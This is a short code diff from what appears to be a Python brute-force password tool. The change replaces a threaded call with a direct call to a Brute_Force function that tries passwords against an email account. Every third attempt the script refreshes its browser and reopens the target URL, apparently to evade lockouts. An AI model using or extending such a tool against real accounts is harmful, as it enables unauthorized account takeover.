@@ -14,7 +14,6 @@ import signal
 import random
 import datetime
 import cookielib
-import threading
 import subprocess 
 #
 from Core.art import Colors
@@ -160,8 +159,7 @@ if __name__ == '__main__':
     try:
      passwrd = passwrd.replace('\n','')
      Message(Email)
-     Bot=threading.Thread(target=(Brute_Force),args=(Email,passwrd));Bot.start()
-     while Bot.is_alive():pass
+     Brute_Force(Email,passwrd)
      if Attempt==3:Refresh();Br.open(Url);Attempt=0
      Attempt+=1
      attempt+=1
